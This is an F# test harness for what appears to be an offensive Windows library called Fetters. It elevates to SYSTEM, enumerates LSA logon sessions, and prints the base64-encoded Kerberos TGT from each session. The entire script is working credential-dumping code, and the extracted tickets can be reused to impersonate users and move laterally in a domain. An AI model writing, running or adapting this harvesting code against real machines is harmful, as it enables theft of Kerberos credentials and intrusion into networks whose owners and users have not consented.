open System
open System.Security.Principal
open System.Runtime.InteropServices

open Fetters.DomainTypes 
open Fetters.NI.Providers
open Fetters.WMI.Providers
open Fetters.dotNetFunctions


// Testing/rework harness
printfn "%s" <| getSystem()
let results = enumerateDomainSessions ()
printfn "Number of LSA Sessions detected: %i" <| results.Length
revertToSelf () |> ignore

results
|> List.map(fun result -> result.kerberosTGTcontents
                          |> List.iter(fun x -> match x with
                                                |KerberosRetrieveTicket xx -> printfn "%20s" xx.base64EncodedTicket
                                                |KerberosQueryTicket xx -> printfn ""))|>ignore
